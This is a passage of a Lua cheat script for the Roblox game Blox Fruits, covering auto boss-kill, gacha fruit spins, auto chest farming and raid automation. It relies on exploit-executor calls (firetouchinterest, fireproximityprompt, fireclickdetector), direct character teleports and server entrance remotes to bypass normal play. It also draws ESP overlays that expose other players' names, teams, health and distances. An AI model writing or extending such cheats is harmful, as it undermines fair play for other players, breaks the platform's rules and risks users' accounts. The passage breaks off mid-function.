    local root = GetRoot()
    if not root then return false end
    if target and target:FindFirstChild("HumanoidRootPart") then
        local dist = GetOptimalFarmDistance(target)
        local farmPos = target.HumanoidRootPart.CFrame * CFrame.new(0, dist, 0) * CFrame.Angles(math.rad(-90), 0, 0)
        local distToFarm = (farmPos.Position - root.Position).Magnitude
        if distToFarm < 15 then
            HoverLock(farmPos)
        else
            TweenTo(farmPos)
        end
        EquipWeapon(_G.Config.SelectedWeapon)
        return true
    else
        local bData = BossesDB[bossName]
        if bData and bData.Sea == CurrentSea then
            local checkPos = bData.Pos * CFrame.new(0, 35, 0)
            if (checkPos.Position - root.Position).Magnitude > 25 then
                TweenTo(checkPos, bossName .. " Spawn Area")
            end
        end
    end
    return false
end

local function StartRaidBossLoop()
    task.spawn(function()
        task.wait(math.random(15, 35) / 10)
        while true do
            task.wait(0.4)
            pcall(function()
                if _G.Config.AutoKillRipIndra then if not FightRaidBoss("rip_indra") then FightRaidBoss("Rip Indra") end end
                if _G.Config.AutoKillDoughKing then FightRaidBoss("Dough King") end
                if _G.Config.AutoKillCakePrince then FightRaidBoss("Cake Prince") end
                if _G.Config.AutoKillSoulReaper then FightRaidBoss("Soul Reaper") end
                if _G.Config.AutoKillDarkbeard then FightRaidBoss("Darkbeard") end
                if _G.Config.AutoKillCursedCaptain then FightRaidBoss("Cursed Captain") end
                if _G.Config.AutoKillLaw then FightRaidBoss("Order") end
            end)
        end
    end)
end

--============================== DEVIL FRUIT SYSTEM ==============================
local GachaPositions = {
    [1] = CFrame.new(-1477.0, 73.2, 41.0),       -- Sea 1 Jungle (Gacha / Zioles)
    [2] = CFrame.new(-380.47, 77.22, 255.82),    -- Sea 2 Cafe (Gacha / Zioles)
    [3] = CFrame.new(-12488.67, 336.26, -7445.75) -- Sea 3 Mansion (Gacha / Zioles)
}

local _nextGachaAttempt = 0
local _isSpinningFruit = false

local function StoreAllPhysicalFruits()
    local cf = CommF()
    if not cf then return end
    pcall(function()
        local bp = LocalPlayer:FindFirstChild("Backpack")
        local char = GetCharacter()
        for _, container in ipairs({bp, char}) do
            if container then
                for _, tool in ipairs(container:GetChildren()) do
                    if tool:IsA("Tool") and tool:FindFirstChild("Handle") and not tool:FindFirstChild("Exp") then
                        if tool.ToolTip == "Blox Fruit" or string.find(tool.Name, "Fruit") or tool:GetAttribute("OriginalName") then
                            cf:InvokeServer("StoreFruit", tool:GetAttribute("OriginalName") or tool.Name, tool)
                            task.wait(0.2)
                        end
                    end
                end
            end
        end
    end)
end

local function SpinRandomFruitNow()
    if _isSpinningFruit then return end
    _isSpinningFruit = true
    task.spawn(function()
        pcall(function()
            local char = GetCharacter()
            local hum = GetHumanoid()
            local root = GetRoot()
            if not char or not hum or hum.Health <= 0 or not root then
                _isSpinningFruit = false
                return
            end

            -- Check player level
            local data = LocalPlayer:FindFirstChild("Data")
            local level = data and data:FindFirstChild("Level") and data.Level.Value or 1
            if level < 50 then
                pcall(function()
                    game:GetService("StarterGui"):SetCore("SendNotification", {
                        Title = "Blox Fruit Gacha",
                        Text = "Level 50+ is required to spin fruits (Current Lv. " .. level .. ")",
                        Duration = 4
                    })
                end)
                _isSpinningFruit = false
                return
            end

            local cf = CommF()
            if not cf then
                _isSpinningFruit = false
                return
            end

            -- Travel to Gacha NPC
            local gachaCF = GachaPositions[CurrentSea] or GachaPositions[1]
            local dist = (gachaCF.Position - root.Position).Magnitude
            if dist > 25 then
                TweenTo(gachaCF * CFrame.new(0, 2, 0), "Blox Fruit Gacha")
                local waitStart = tick()
                while (tick() - waitStart) < 30 do
                    root = GetRoot()
                    if not root then break end
                    if (gachaCF.Position - root.Position).Magnitude <= 25 then break end
                    task.wait(0.2)
                end
            end

            task.wait(0.5)
            root = GetRoot()
            if root and (gachaCF.Position - root.Position).Magnitude <= 40 then
                HoverLock(gachaCF * CFrame.new(0, 2, 0))
                local res = cf:InvokeServer("Cousin", "Buy")
                task.wait(0.8)
                
                -- Check if a fruit was received and store it
                StoreAllPhysicalFruits()

                pcall(function()
                    game:GetService("StarterGui"):SetCore("SendNotification", {
                        Title = "Blox Fruit Gacha",
                        Text = "Fruit Spin Attempted! Check inventory/backpack.",
                        Duration = 4
                    })
                end)
            end
        end)
        _isSpinningFruit = false
    end)
end
_G.SpinRandomFruitNow = SpinRandomFruitNow
_G.StoreAllPhysicalFruits = StoreAllPhysicalFruits

local function StartDevilFruitLoops()
    -- Auto Random Gacha Loop
    task.spawn(function()
        task.wait(math.random(20, 40) / 10)
        while true do
            task.wait(2.5 + math.random() * 0.5)
            if _G.Config.AutoRandomFruit and not _isSpinningFruit and not IsTravelingSky then
                local now = tick()
                if now >= _nextGachaAttempt then
                    local data = LocalPlayer:FindFirstChild("Data")
                    local level = data and data:FindFirstChild("Level") and data.Level.Value or 1
                    local beli = data and data:FindFirstChild("Beli") and data.Beli.Value or 0
                    
                    if level >= 50 and beli >= 25000 then
                        _isSpinningFruit = true
                        pcall(function()
                            local root = GetRoot()
                            local cf = CommF()
                            if root and cf then
                                local gachaCF = GachaPositions[CurrentSea] or GachaPositions[1]
                                local dist = (gachaCF.Position - root.Position).Magnitude
                                if dist > 25 then
                                    TweenTo(gachaCF * CFrame.new(0, 2, 0), "Blox Fruit Gacha")
                                    local waitStart = tick()
                                    while (tick() - waitStart) < 30 do
                                        root = GetRoot()
                                        if not root then break end
                                        if (gachaCF.Position - root.Position).Magnitude <= 25 then break end
                                        task.wait(0.2)
                                    end
                                end
                                
                                task.wait(0.5)
                                root = GetRoot()
                                if root and (gachaCF.Position - root.Position).Magnitude <= 40 then
                                    HoverLock(gachaCF * CFrame.new(0, 2, 0))
                                    local buyRes = cf:InvokeServer("Cousin", "Buy")
                                    task.wait(0.8)
                                    
                                    if _G.Config.AutoStoreFruit then
                                        StoreAllPhysicalFruits()
                                    end
                                    
                                    -- Set 2h cooldown + 5s buffer
                                    _nextGachaAttempt = now + 7205
                                else
                                    -- Retry shortly if couldn't reach
                                    _nextGachaAttempt = now + 60
                                end
                            end
                        end)
                        _isSpinningFruit = false
                    else
                        -- Low level or insufficient Beli, check back in 2 minutes
                        _nextGachaAttempt = now + 120
                    end
                end
            end
        end
    end)

    -- Auto Store Fruits
    task.spawn(function()
        task.wait(math.random(22, 42) / 10)
        while true do
            task.wait(2.0 + math.random() * 0.5)
            if _G.Config.AutoStoreFruit then
                StoreAllPhysicalFruits()
            end
        end
    end)

    -- Auto Grab Dropped Fruits
    task.spawn(function()
        task.wait(math.random(25, 45) / 10)
        while true do
            task.wait(1.5 + math.random() * 0.3)
            if _G.Config.AutoGrabFruits and not _isSpinningFruit then
                pcall(function()
                    for _, obj in ipairs(Workspace:GetChildren()) do
                        if obj:IsA("Tool") and (string.find(obj.Name, "Fruit") or obj.ToolTip == "Blox Fruit") and obj:FindFirstChild("Handle") then
                            TweenTo(obj.Handle.CFrame * CFrame.new(0, 1.5, 0), "Dropped Fruit (" .. obj.Name .. ")")
                            task.wait(0.8)
                            if _G.Config.AutoStoreFruit then
                                StoreAllPhysicalFruits()
                            end
                        end
                    end
                end)
            end
        end
    end)
end


--============================== FULL VISUALS & ESP SUITE ==============================
local ESPFolder = {}
local function ClearESP(category)
    if ESPFolder[category] then
        for _, obj in pairs(ESPFolder[category]) do
            if obj and obj.Parent then pcall(function() obj:Destroy() end) end
        end
        ESPFolder[category] = {}
    else
        ESPFolder[category] = {}
    end
end

-- 1. Player ESP
local function UpdatePlayerESP()
    ClearESP("Players")
    if not _G.Config.PlayerESP then return end
    local root = GetRoot()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid.Health > 0 then
            local pHrp = plr.Character.HumanoidRootPart
            local pHum = plr.Character.Humanoid
            local dist = root and math.floor((pHrp.Position - root.Position).Magnitude) or 0
            
            local bill = Instance.new("BillboardGui")
            bill.Name = RNG()
            bill.Adornee = pHrp
            bill.Size = UDim2.new(0, 150, 0, 48)
            bill.StudsOffset = Vector3.new(0, 3.5, 0)
            bill.AlwaysOnTop = true
            bill.Parent = pHrp
            
            local isMarine = (plr.Team and plr.Team.Name:find("Marine"))
            local teamColor = isMarine and Color3.fromRGB(0, 175, 255) or Color3.fromRGB(255, 55, 75)
            
            local nameLabel = Instance.new("TextLabel")
            nameLabel.Size = UDim2.new(1, 0, 0, 18)
            nameLabel.BackgroundTransparency = 1
            nameLabel.Text = (isMarine and "[Marine] " or "[Pirate] ") .. plr.DisplayName .. " (@" .. plr.Name .. ")"
            nameLabel.TextColor3 = teamColor
            nameLabel.Font = Enum.Font.GothamBold
            nameLabel.TextSize = 11
            nameLabel.Parent = bill
            
            local hpLabel = Instance.new("TextLabel")
            hpLabel.Size = UDim2.new(1, 0, 0, 14)
            hpLabel.Position = UDim2.new(0, 0, 0, 18)
            hpLabel.BackgroundTransparency = 1
            hpLabel.Text = "HP: " .. math.floor(pHum.Health) .. "/" .. math.floor(pHum.MaxHealth) .. " • " .. dist .. " studs"
            hpLabel.TextColor3 = Color3.fromRGB(100, 255, 130)
            hpLabel.Font = Enum.Font.GothamMedium
            hpLabel.TextSize = 10
            hpLabel.Parent = bill
            
            table.insert(ESPFolder["Players"], bill)
        end
    end
end

-- 2. Fruit ESP with Rarity Coding
local function GetFruitColor(name)
    local lower = name:lower()
    if lower:find("kitsune") or lower:find("dragon") or lower:find("leopard") or lower:find("t-rex") or lower:find("mammoth") or lower:find("dough") or lower:find("venom") or lower:find("spirit") or lower:find("shadow") then
        return Color3.fromRGB(255, 45, 95) -- Mythical Red/Pink
    elseif lower:find("blizzard") or lower:find("portal") or lower:find("rumble") or lower:find("buddha") or lower:find("phoenix") or lower:find("sound") or lower:find("quake") then
        return Color3.fromRGB(200, 50, 255) -- Legendary Magenta
    elseif lower:find("magma") or lower:find("ghost") or lower:find("light") or lower:find("dark") or lower:find("ice") then
        return Color3.fromRGB(0, 215, 255) -- Rare Cyan
    else
        return Color3.fromRGB(180, 180, 195) -- Common Gray
    end
end

local function UpdateFruitESP()
    ClearESP("Fruits")
    if not _G.Config.FruitESP then return end
    local root = GetRoot()
    for _, obj in ipairs(Workspace:GetChildren()) do
        if obj:IsA("Tool") and (string.find(obj.Name, "Fruit") or obj.ToolTip == "Blox Fruit") and obj:FindFirstChild("Handle") then
            local dist = root and math.floor((obj.Handle.Position - root.Position).Magnitude) or 0
            local bill = Instance.new("BillboardGui")
            bill.Name = RNG()
            bill.Adornee = obj.Handle
            bill.Size = UDim2.new(0, 130, 0, 34)
            bill.StudsOffset = Vector3.new(0, 2.5, 0)
            bill.AlwaysOnTop = true
            bill.Parent = obj.Handle
            
            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(1, 0, 1, 0)
            label.BackgroundTransparency = 1
            label.Text = "[Fruit] " .. obj.Name .. "\n[" .. dist .. " studs]"
            label.TextColor3 = GetFruitColor(obj.Name)
            label.Font = Enum.Font.GothamBold
            label.TextSize = 11
            label.Parent = bill
            table.insert(ESPFolder["Fruits"], bill)
        end
    end
end

-- 3. Chest ESP & Auto Chest Collection (Active Spawns Only)
local _collectedChests = {}

local function GetPlayerBeli()
    local lp = LocalPlayer
    if not lp then return 0 end
    local data = lp:FindFirstChild("Data")
    if data and data:FindFirstChild("Beli") then
        return tonumber(data.Beli.Value) or 0
    end
    local ls = lp:FindFirstChild("leaderstats")
    if ls and ls:FindFirstChild("Beli") then
        return tonumber(ls.Beli.Value) or 0
    end
    return 0
end

local function GetSpawnedChests()
    local chests = {}
    local seen = {}
    local now = tick()
    
    local function AddChest(part, model)
        if not part or seen[part] then return end
        if _collectedChests[part] and now < _collectedChests[part] then return end
        if model and _collectedChests[model] and now < _collectedChests[model] then return end
        seen[part] = true
        if model then seen[model] = true end
        table.insert(chests, part)
    end
    
    local function CheckModel(m)
        if not m or not m:IsA("Model") or seen[m] then return end
        local n = m.Name:lower()
        if n:find("chest") then
            local visual = m:FindFirstChild("BottomWood") or m:FindFirstChild("TopWood")
            if visual and visual.Transparency >= 0.95 then return end
            
            local touchPart = m:FindFirstChild("PushBox") or m:FindFirstChild("RootPart") or m:FindFirstChild("BottomWood") or m.PrimaryPart or m:FindFirstChildWhichIsA("BasePart")
            if touchPart then
                AddChest(touchPart, m)
            end
        end
    end
    -- 1. Scan ChestModels & Chests folders (skip expensive workspace root iteration)
    -- 2. Scan ChestModels & Chests folders
    local cm = Workspace:FindFirstChild("ChestModels")
    if cm then
        for _, c in ipairs(cm:GetChildren()) do
            if c:IsA("Model") then CheckModel(c)
            elseif c:IsA("BasePart") then AddChest(c, nil) end
        end
    end
    local cf = Workspace:FindFirstChild("Chests")
    if cf then
        for _, c in ipairs(cf:GetChildren()) do
            if c:IsA("Model") then CheckModel(c)
            elseif c:IsA("BasePart") then AddChest(c, nil) end
        end
    end
    
    -- 3. Scan Map islands
    local map = Workspace:FindFirstChild("Map")
    if map then
        for _, island in ipairs(map:GetChildren()) do
            for _, c in ipairs(island:GetChildren()) do
                if c:IsA("Model") then CheckModel(c)
                elseif c:IsA("BasePart") and c.Name:lower():find("chest") then AddChest(c, nil) end
            end
            local icm = island:FindFirstChild("ChestModels") or island:FindFirstChild("Chests")
            if icm then
                for _, c in ipairs(icm:GetChildren()) do
                    if c:IsA("Model") then CheckModel(c)
                    elseif c:IsA("BasePart") then AddChest(c, nil) end
                end
            end
        end
    end
    
    return chests
end

local function UpdateChestESP()
    ClearESP("Chests")
    if not _G.Config.ChestESP then return end
    local root = GetRoot()
    for _, chest in ipairs(GetSpawnedChests()) do
        local part = chest:IsA("BasePart") and chest or chest:FindFirstChildWhichIsA("BasePart")
        if part then
            local dist = root and math.floor((part.Position - root.Position).Magnitude) or 0
            local bill = Instance.new("BillboardGui")
            bill.Name = RNG()
            bill.Adornee = part
            bill.Size = UDim2.new(0, 100, 0, 24)
            bill.StudsOffset = Vector3.new(0, 2, 0)
            bill.AlwaysOnTop = true
            bill.Parent = part
            
            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(1, 0, 1, 0)
            label.BackgroundTransparency = 1
            label.Text = "[Chest] " .. chest.Name .. " [" .. dist .. "m]"
            label.TextColor3 = Color3.fromRGB(255, 215, 0)
            label.Font = Enum.Font.GothamMedium
            label.TextSize = 10
            label.Parent = bill
            table.insert(ESPFolder["Chests"], bill)
        end
    end
end

-- 4. Flower ESP (Bartilo Quest)
local function UpdateFlowerESP()
    ClearESP("Flowers")
    if not _G.Config.FlowerESP then return end
    local root = GetRoot()
    for _, obj in ipairs(Workspace:GetChildren()) do
        if string.find(obj.Name:lower(), "flower") then
            local part = obj:IsA("BasePart") and obj or obj:FindFirstChildWhichIsA("BasePart")
            if part then
                local dist = root and math.floor((part.Position - root.Position).Magnitude) or 0
                local bill = Instance.new("BillboardGui")
                bill.Name = RNG()
                bill.Adornee = part
                bill.Size = UDim2.new(0, 110, 0, 26)
                bill.StudsOffset = Vector3.new(0, 2, 0)
                bill.AlwaysOnTop = true
                bill.Parent = part
                
                local col = obj.Name:find("1") and Color3.fromRGB(0, 150, 255) or (obj.Name:find("2") and Color3.fromRGB(255, 50, 50) or Color3.fromRGB(255, 220, 0))
                local label = Instance.new("TextLabel")
                label.Size = UDim2.new(1, 0, 1, 0)
                label.BackgroundTransparency = 1
                label.Text = "[Flower] " .. obj.Name .. " [" .. dist .. "m]"
                label.TextColor3 = col
                label.Font = Enum.Font.GothamBold
                label.TextSize = 11
                label.Parent = bill
                table.insert(ESPFolder["Flowers"], bill)
            end
        end
    end
end

-- 5. Mirage Island & Sea Events ESP
local function UpdateSeaEventESP()
    ClearESP("SeaEvents")
    if not _G.Config.MirageESP and not _G.Config.SeaEventESP then return end
    local root = GetRoot()
    
    if _G.Config.MirageESP then
        local mirage = Workspace:FindFirstChild("Mirage Island") or (Workspace:FindFirstChild("_WorldOrigin") and Workspace._WorldOrigin.Locations:FindFirstChild("Mirage Island"))
        if mirage then
            local part = mirage:IsA("BasePart") and mirage or mirage:FindFirstChildWhichIsA("BasePart")
            if part then
                local dist = root and math.floor((part.Position - root.Position).Magnitude) or 0
                local bill = Instance.new("BillboardGui")
                bill.Name = RNG()
                bill.Adornee = part
                bill.Size = UDim2.new(0, 170, 0, 40)
                bill.StudsOffset = Vector3.new(0, 60, 0)
                bill.AlwaysOnTop = true
                bill.Parent = part
                
                local label = Instance.new("TextLabel")
                label.Size = UDim2.new(1, 0, 1, 0)
                label.BackgroundTransparency = 1
                label.Text = "MIRAGE ISLAND ACTIVE!\n[" .. dist .. " studs]"
                label.TextColor3 = Color3.fromRGB(150, 110, 255)
                label.Font = Enum.Font.GothamBold
                label.TextSize = 12
                label.Parent = bill
                table.insert(ESPFolder["SeaEvents"], bill)
            end
        end
    end
    
    if _G.Config.SeaEventESP then
        local function CheckSeaMob(mob, icon, col)
            if mob and mob:FindFirstChild("HumanoidRootPart") then
                local dist = root and math.floor((mob.HumanoidRootPart.Position - root.Position).Magnitude) or 0
                local bill = Instance.new("BillboardGui")
                bill.Name = RNG()
                bill.Adornee = mob.HumanoidRootPart
                bill.Size = UDim2.new(0, 150, 0, 36)
                bill.StudsOffset = Vector3.new(0, 18, 0)
                bill.AlwaysOnTop = true
                bill.Parent = mob.HumanoidRootPart
                
                local label = Instance.new("TextLabel")
                label.Size = UDim2.new(1, 0, 1, 0)
                label.BackgroundTransparency = 1
                label.Text = icon .. " " .. mob.Name .. "\n[" .. dist .. " studs]"
                label.TextColor3 = col
                label.Font = Enum.Font.GothamBold
                label.TextSize = 11
                label.Parent = bill
                table.insert(ESPFolder["SeaEvents"], bill)
            end
        end
        
        local sbFolder = Workspace:FindFirstChild("SeaBeasts")
        if sbFolder then
            for _, sb in ipairs(sbFolder:GetChildren()) do
                CheckSeaMob(sb, "[SB]", Color3.fromRGB(240, 240, 255))
            end
        end
        local enemies = Workspace:FindFirstChild("Enemies")
        if enemies then
            for _, mob in ipairs(enemies:GetChildren()) do
                if string.find(mob.Name, "SeaBeast") or string.find(mob.Name, "Sea Beast") then
                    CheckSeaMob(mob, "[Sea Mob]", Color3.fromRGB(240, 240, 255))
                elseif string.find(mob.Name, "Terror Shark") then
                    CheckSeaMob(mob, "[Shark]", Color3.fromRGB(240, 240, 255))
                end
            end
        end
    end
end

local ChestIslandCircuits = {
    [1] = {
        CFrame.new(1059.37, 16.51, 1546.99),  -- Pirate Starter
        CFrame.new(-655.82, 15.0, 1588.65),   -- Middle Town
        CFrame.new(-1612.33, 36.85, 149.13),  -- Jungle
        CFrame.new(-1181.39, 15.0, 3843.43),  -- Pirate Village
        CFrame.new(1094.11, 15.0, 4192.89),   -- Desert
        CFrame.new(1384.81, 87.27, -1298.47), -- Snow Island
        CFrame.new(-5035.79, 28.65, 4324.96), -- Marineford
        CFrame.new(4875.33, 15.0, 735.45),    -- Prison
        CFrame.new(-1427.62, 15.0, -2792.77), -- Colosseum
        CFrame.new(-5247.72, 15.0, 8504.68),  -- Magma Village
        CFrame.new(5127.13, 59.50, 4105.45)   -- Fountain City
    },
    [2] = {
        CFrame.new(-380.47, 77.22, 255.82),     -- Kingdom of Rose / Cafe
        CFrame.new(-288.45, 306.13, 597.53),    -- Mansion
        CFrame.new(-2448.53, 73.02, -3210.63),  -- Green Bit
        CFrame.new(608.24, 401.52, -5372.46),   -- Snow Mountain
        CFrame.new(5422.31, 28.25, -6767.13),   -- Ice Castle / Hot & Cold
        CFrame.new(-3054.44, 237.15, -10142.82),-- Forgotten Island
        CFrame.new(-5418.89, 48.52, -774.75),   -- Graveyard / Zombie Island
        CFrame.new(878.01, 121.98, 1235.35)     -- Cursed Ship
    },
    [3] = {
        CFrame.new(-290.74, 15.0, 5343.55),     -- Port Town
        CFrame.new(5749.73, 610.42, -267.78),   -- Hydra Island
        CFrame.new(2681.27, 1682.80, -7190.99), -- Great Tree
        CFrame.new(-12463.87, 374.91, -7523.77),-- Floating Turtle Mansion
        CFrame.new(-5085.24, 314.52, -3156.26), -- Castle on the Sea
        CFrame.new(-9516.99, 172.01, 6078.47),  -- Haunted Castle
        CFrame.new(-2100.12, 70.12, -12150.34), -- Tiki Outpost
        CFrame.new(-2159.17, 38.24, -10193.24), -- Cake Land / Chocolate Island
        CFrame.new(-710.23, 381.12, -11150.45), -- Ice Cream Island
        CFrame.new(-1500.50, 45.0, -9200.00),   -- Peanut Island
        CFrame.new(-900.00, 50.0, -10800.00),   -- CandyCane / CakeLoaf
        CFrame.new(-1800.00, 55.0, -11500.00)   -- Fishmen Island
    }
}

local _chestCircuitIndex = 1

local function GetNearbyChests(maxRadius)
    maxRadius = maxRadius or 1800
    local root = GetRoot()
    if not root then return {} end
    
    local allChests = GetSpawnedChests()
    local nearby = {}
    for _, c in ipairs(allChests) do
        local pos = c:IsA("BasePart") and c.Position or nil
        if pos then
            local d = (pos - root.Position).Magnitude
            if d <= maxRadius then
                table.insert(nearby, {part = c, dist = d, pos = pos})
            end
        end
    end
    table.sort(nearby, function(a, b) return a.dist < b.dist end)
    return nearby
end

local function StartChestFarmLoop()
    task.spawn(function()
        task.wait(1.0)
        local isFarmingChest = false
        
        while true do
            task.wait(0.4)
            if _G.Config.AutoChestFarm and not isFarmingChest then
                local ok, err = pcall(function()
                    local root = GetRoot()
                    local hum = GetHumanoid()
                    if not root or not hum or hum.Health <= 0 then return end
                    
                    -- 1. Check for uncollected chests on the CURRENT ISLAND (within 1800 studs)
                    local nearby = GetNearbyChests(1800)
                    
                    if #nearby > 0 then
                        -- Farm all chests on this island one by one
                        local target = nearby[1]
                        local targetPart = target.part
                        local chestModel = targetPart.Parent and targetPart.Parent:IsA("Model") and targetPart.Parent or targetPart
                        
                        isFarmingChest = true
                        
                        local chestCF = targetPart.CFrame * CFrame.new(0, 1.8, 0)
                        TweenTo(chestCF, "Chest (" .. targetPart.Name .. ")")
                        
                        -- Wait until arrived or timeout
                        local tStart = tick()
                        local dist = (targetPart.Position - root.Position).Magnitude
                        local timeout = math.clamp(dist / 180, 3, 20)
                        while _G.Config.AutoChestFarm and (targetPart.Position - root.Position).Magnitude > 16 and (tick() - tStart) < timeout do
                            task.wait(0.2)
                            if not targetPart.Parent then break end
                        end
                        
                        if _G.Config.AutoChestFarm and targetPart.Parent and (targetPart.Position - root.Position).Magnitude <= 20 then
                            -- Cashout collection at chest
                            local beforeBeli = GetPlayerBeli()
                            local tCollect = tick()
                            
                            while _G.Config.AutoChestFarm and (tick() - tCollect) < 2.0 do
                                root.CFrame = chestCF
                                root.AssemblyLinearVelocity = Vector3.zero
                                root.AssemblyAngularVelocity = Vector3.zero
                                
                                if firetouchinterest then
                                    pcall(function()
                                        local pb = chestModel:FindFirstChild("PushBox") or targetPart
                                        firetouchinterest(root, pb, 0)
                                        task.wait(0.03)
                                        firetouchinterest(root, pb, 1)
                                        if pb ~= targetPart then
                                            firetouchinterest(root, targetPart, 0)
                                            task.wait(0.03)
                                            firetouchinterest(root, targetPart, 1)
                                        end
                                        local rp = chestModel:FindFirstChild("RootPart")
                                        if rp and rp ~= pb and rp ~= targetPart then
                                            firetouchinterest(root, rp, 0)
                                            task.wait(0.03)
                                            firetouchinterest(root, rp, 1)
                                        end
                                    end)
                                end
                                
                                local prompt = targetPart:FindFirstChildWhichIsA("ProximityPrompt", true) or (chestModel and chestModel:FindFirstChildWhichIsA("ProximityPrompt", true))
                                if prompt and fireproximityprompt then
                                    pcall(function() fireproximityprompt(prompt) end)
                                end
                                
                                if GetPlayerBeli() > beforeBeli then break end
                                task.wait(0.1)
                            end
                        end
                        
                        -- Mark as collected on cooldown (120s)
                        _collectedChests[targetPart] = tick() + 120
                        if chestModel ~= targetPart then _collectedChests[chestModel] = tick() + 120 end
                        
                        StopTween()
                        task.wait(0.25)
                        isFarmingChest = false
                    else
                        -- 2. Island cleared! Fly to the NEXT island in the sea circuit!
                        local circuit = ChestIslandCircuits[CurrentSea] or ChestIslandCircuits[1]
                        if circuit and #circuit > 0 then
                            _chestCircuitIndex = _chestCircuitIndex or 1
                            local nextIslandPos = circuit[_chestCircuitIndex] * CFrame.new(0, 25, 0)
                            local distToIsland = (nextIslandPos.Position - root.Position).Magnitude
                            
                            if distToIsland > 60 then
                                isFarmingChest = true
                                TweenTo(nextIslandPos, "Patrol Island")
                                
                                local pStart = tick()
                                local flyTime = (distToIsland / 235) + 6.0
                                while _G.Config.AutoChestFarm and (nextIslandPos.Position - root.Position).Magnitude > 60 and (tick() - pStart) < flyTime do
                                    task.wait(0.4)
                                end
                                
                                -- Arrived at island! Wait 1.5s for terrain & chests to stream in
                                StopTween()
                                task.wait(1.5)
                                
                                -- Advance circuit index for next island
                                _chestCircuitIndex = (_chestCircuitIndex % #circuit) + 1
                                isFarmingChest = false
                            else
                                -- Already at this island, advance index
                                _chestCircuitIndex = (_chestCircuitIndex % #circuit) + 1
                                task.wait(1.0)
                            end
                        end
                    end
                end)
                if not ok then
                    warn("[ChestFarm] Error: " .. tostring(err))
                    isFarmingChest = false
                    task.wait(1.5)
                end
            end
        end
    end)
end


local _currentRaidIsland = 1
local _noMobStartTick = 0

local function GetLocalRaidIsland(idx)
    local root = GetRoot()
    if not root then return nil end
    local locs = Workspace:FindFirstChild("_WorldOrigin") and Workspace._WorldOrigin:FindFirstChild("Locations")
    local map = Workspace:FindFirstChild("Map")
    local raidMap = map and map:FindFirstChild("RaidMap")
    
    local candidates = {}
    local pattern = "Island%s*" .. tostring(idx) .. "$"
    local patternAlt = "RaidIsland%s*" .. tostring(idx) .. "$"
    
    -- 1. Search _WorldOrigin.Locations
    if locs then
        for _, l in ipairs(locs:GetChildren()) do
            if l.Name:match(pattern) or l.Name == ("Island " .. idx) or l.Name == ("Island" .. idx) then
                local p = l:IsA("BasePart") and l.Position or (l:IsA("Model") and l:GetPivot().Position)
                if p then
                    local d = (p - root.Position).Magnitude
                    table.insert(candidates, {obj = l, pos = p, dist = d})
                end
            end
        end
    end
    
    -- 2. Search Map.RaidMap
    if raidMap then
        for _, r in ipairs(raidMap:GetChildren()) do
            if r.Name:match(pattern) or r.Name:match(patternAlt) or r.Name == ("RaidIsland" .. idx) or r.Name == ("Island " .. idx) then
                local p = r:IsA("BasePart") and r.Position or (r:IsA("Model") and (r.PrimaryPart and r.PrimaryPart.Position or (r:FindFirstChildWhichIsA("BasePart") and r:FindFirstChildWhichIsA("BasePart").Position)))
                if p then
                    local d = (p - root.Position).Magnitude
                    table.insert(candidates, {obj = r, pos = p, dist = d})
                end
            end
        end
    end
    
    table.sort(candidates, function(a, b) return a.dist < b.dist end)
    
    -- Pick closest candidate within local raid arena (< 3500 studs)
    for _, c in ipairs(candidates) do
        if c.dist < 3500 then
            return c.pos, c.obj
        end
    end
    
    -- Fallback: closest candidate
    if #candidates > 0 and candidates[1].dist < 5000 then
        return candidates[1].pos, candidates[1].obj
    end
    return nil, nil
end

local function StartAdvancedRaidEngine()
    task.spawn(function()
        task.wait(2.0)
        while true do
            task.wait(0.3)
            pcall(function()
                local cf = CommF()
                local root = GetRoot()
                local hum = GetHumanoid()
                if not root or not hum or hum.Health <= 0 then return end
                
                local inRaid = (root.Position.X > 50000) or (Workspace:FindFirstChild("Map") and Workspace.Map:FindFirstChild("RaidMap") ~= nil)
                
                -- ================= AUTO START RAID (OUTSIDE RAID) =================
                if _G.Config.AutoStartRaid and not inRaid then
                    local char = LocalPlayer.Character
                    local bp = LocalPlayer:FindFirstChild("Backpack")
                    local hasChip = (char and char:FindFirstChild("Special Microchip")) or (bp and bp:FindFirstChild("Special Microchip"))
                    
                    -- Auto Buy Chip if enabled or if player has none
                    if _G.Config.AutoBuyChip or not hasChip then
                        pcall(function()
                            if cf then cf:InvokeServer("RaidsNpc", "Select", _G.Config.SelectedChip or "Flame") end
                        end)
                    end
                    
                    if CurrentSea == 3 then
                        -- Third Sea: Castle on the Sea Raid Lab
                        local castlePortal = Vector3.new(-5035.43, 314.52, -2917.48)
                        local raidPodCF = CFrame.new(-5014.28, 315.0, -2824.15)
                        local distToCastle = (root.Position - castlePortal).Magnitude
                        local distToPod = (root.Position - raidPodCF.Position).Magnitude
                        
                        if distToCastle > 1000 and distToPod > 300 then
                            -- Fast server entrance teleport to Castle on the Sea
                            local okEntrance = false
                            if cf then
                                okEntrance = pcall(function() return cf:InvokeServer("requestEntrance", castlePortal) end)
                            end
                            if not okEntrance or (root.Position - castlePortal).Magnitude > 500 then
                                TweenTo(CFrame.new(castlePortal), "Castle on Sea")
                            end
                        elseif distToPod > 18 then
                            TweenTo(raidPodCF, "Raid Pod")
                        else
                            -- Inside Castle raid tube! Lock position and start raid
                            HoverLock(raidPodCF)
                            if cf then
                                pcall(function() cf:InvokeServer("RaidsNpc", "Start") end)
                            end
                            -- Also trigger any click detector inside the pod room
                            for _, obj in ipairs(Workspace:GetDescendants()) do
                                if obj:IsA("ClickDetector") and (obj.Parent.Position - root.Position).Magnitude < 20 then
                                    pcall(function() fireclickdetector(obj) end)
                                end
                            end
                        end
                    elseif CurrentSea == 2 then
                        -- Second Sea: Circle Island Lab (Cold/Hot)
                        local podPos = Vector3.new(-6473.5, 250.5, -4490.5)
                        local distToPod = (root.Position - podPos).Magnitude
                        if distToPod > 25 then
                            TweenTo(CFrame.new(podPos + Vector3.new(0, 3, 0)), "Raid Pod")
                        else
                            HoverLock(CFrame.new(podPos + Vector3.new(0, 3, 0)))
                            if cf then pcall(function() cf:InvokeServer("RaidsNpc", "Start") end) end
                        end
                    end
                end
                
                -- ================= AUTO FARM RAID (INSIDE RAID) =================
                if _G.Config.AutoFarmRaid and inRaid then
                    local enemies = Workspace:FindFirstChild("Enemies")
                    local islandPos, islandObj = GetLocalRaidIsland(_currentRaidIsland)
                    
